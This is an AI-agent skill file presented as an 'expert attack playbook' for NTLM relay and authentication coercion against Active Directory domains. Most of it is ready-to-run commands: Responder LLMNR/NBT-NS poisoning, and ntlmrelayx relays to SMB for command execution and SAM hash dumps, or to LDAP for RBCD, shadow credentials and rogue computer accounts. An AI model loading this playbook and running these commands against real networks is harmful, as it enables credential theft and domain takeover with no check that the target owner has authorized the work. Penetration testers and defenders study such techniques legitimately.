---
name: ntlm-relay-coercion
description: "NTLM relay and authentication coercion playbook. Signals: AD attack, domain penetration, domain controller."
zh-signals: "NTLM relay and authentication coercion playbook 信号:ad攻击,域渗透,域控。"
when-to-use: >-
  NTLM relay and authentication coercion playbook. Use when capturing and relaying NTLM authentication to escalate privileges via SMB, LDAP, HTTP, or MSSQL relay targets, combined with PetitPotam, PrinterBug, and other coercion methods.
---

# SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert NTLM relay and coercion techniques. Covers relay to SMB/LDAP/HTTP/MSSQL, signing requirements, Responder poisoning, mitm6, cross-protocol relay, WebDAV coercion, and all major coercion methods. Base models miss signing/EPA requirements and cross-protocol relay constraints.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ESC8 (relay to ADCS enrollment)
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL modification via LDAP relay (RBCD, shadow creds)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks after relay success
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for post-relay lateral movement

### Advanced Reference

Also load COERCION_METHODS.md when you need:
- Detailed coercion method comparison (PetitPotam, PrinterBug, DFSCoerce, etc.)
- RPC function-level details and prerequisites
- Coercer tool usage and discovery

---

## 1. NTLM RELAY FUNDAMENTALS

```
Victim          Attacker (relay)         Target
  │                 │                      │
  │── NTLM Auth ──→│                      │  (1) Victim authenticates (coerced/poisoned)
  │                 │── Forward Auth ─────→│  (2) Attacker relays to target
  │                 │←─ Challenge ──────── │  (3) Target sends challenge
  │←─ Challenge ────│                      │  (4) Attacker forwards challenge to victim
  │── Response ────→│                      │  (5) Victim computes response
  │                 │── Forward Response ─→│  (6) Attacker relays response to target
  │                 │←─ Authenticated! ────│  (7) Target accepts → attacker has session
```

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
|---|---|---|
| Security | Weak (crackable to NTLM hash) | Stronger (but still relayable) |
| Relay | Yes | Yes |
| Crack to hash | Yes (rainbow tables, crack.sh) | Offline brute-force only |
| Downgrade | Force via Responder `--lm` | Default in modern Windows |

---

## 2. RELAY TARGET MATRIX

| Target Protocol | What You Get | Signing Required by Default? | EPA/Channel Binding? |
|---|---|---|---|
| **SMB** | Command exec (if admin), file access | **DCs: Yes**, Workstations: No | No |
| **LDAP** | ACL modification, RBCD, shadow creds, add computer | **DCs: No** (negotiated) | No (unless configured) |
| **LDAPS** | Same as LDAP but encrypted | N/A | **Yes** (channel binding) |
| **HTTP (ADCS)** | Certificate enrollment (ESC8) | No | Depends on config |
| **MSSQL** | SQL queries, xp_cmdshell | No | No |
| **IMAP/SMTP** | Email access | No | No |
| **RPC** | Various (CA enrollment for ESC11) | Depends | No |

### Signing Check

```bash
# Check SMB signing on target
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
# Outputs hosts WITHOUT required SMB signing

# Nmap SMB signing check
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — CREDENTIAL CAPTURE

### LLMNR/NBT-NS/WPAD/mDNS Poisoning

```bash
# Start Responder (capture mode — don't relay, just capture hashes)
responder -I eth0 -dwP

# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Key protocols poisoned:
# LLMNR (UDP 5355) — Link-Local Multicast Name Resolution
# NBT-NS (UDP 137)  — NetBIOS Name Service
# WPAD              — Web Proxy Auto-Discovery (proxy config)
# mDNS (UDP 5353)   — Multicast DNS
```

### Responder + Relay (Don't Capture, Relay Instead)

```bash
# Disable HTTP and SMB servers in Responder (ntlmrelayx will handle them)
# Edit /etc/responder/Responder.conf: set HTTP and SMB to Off

# Start Responder for poisoning only
responder -I eth0 -dwP

# Start ntlmrelayx for relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — RELAY EXECUTION

### Relay to SMB (Admin Execution)

```bash
# Execute command on targets (requires admin privs on target)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SOCKS proxy (maintain sessions)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then: proxychains smbclient //TARGET/C$ -U DOMAIN/user
```

### Relay to LDAP (ACL Modification)

```bash
# Automatic RBCD (delegate-access)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Escalate via shadow credentials
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support

# Add computer account
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support

# Dump domain info
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.

> 📎 **Reference Document Notice**: this skill is adapted from an upstream open-source repository; the following reference document is **not distributed with this library**: `COERCION_METHODS.md`. The key points of the related topics are retained in the corresponding descriptions in this document; if you need the expanded content, grep the library using keywords from the body text or search on your own.
